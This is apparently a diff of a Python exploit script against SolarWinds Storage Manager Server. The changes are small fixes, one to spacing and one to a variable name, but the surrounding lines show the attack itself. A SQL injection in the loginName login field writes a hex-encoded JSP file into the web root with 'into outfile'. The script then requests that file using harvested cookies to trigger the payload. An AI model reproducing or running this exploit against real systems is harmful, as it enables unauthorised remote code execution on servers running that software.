@@ -30,7 +30,7 @@ print "(+) Author:Win Sam"
 
 rand=randomString()
 directory='"C:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s.jsp"'% rand
-path="'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile %s #" %(bs.hexlify(final),directory)
+path="'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile %s #" %(bs.hexlify(final), directory)
 data="loginState=checkLogin&loginName=" + path  + "&password="
 headers={"Content-Type":"application/x-www-form-urlencoded"}
 print "(+) Uploading Malicious file using SQL Injection"
@@ -48,6 +48,6 @@ print "(+) Cookies Found"
 print cookies
 print "(+) Triggering the payload"
 url3="http://%s:9000/%s.jsp"%(victimip,rand)
-print "(+) Payload at %s" %url 
+print "(+) Payload at %s" %url3
 headers={'User-Agent':'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate'}
 requests.get(url3, cookies=cookies).text
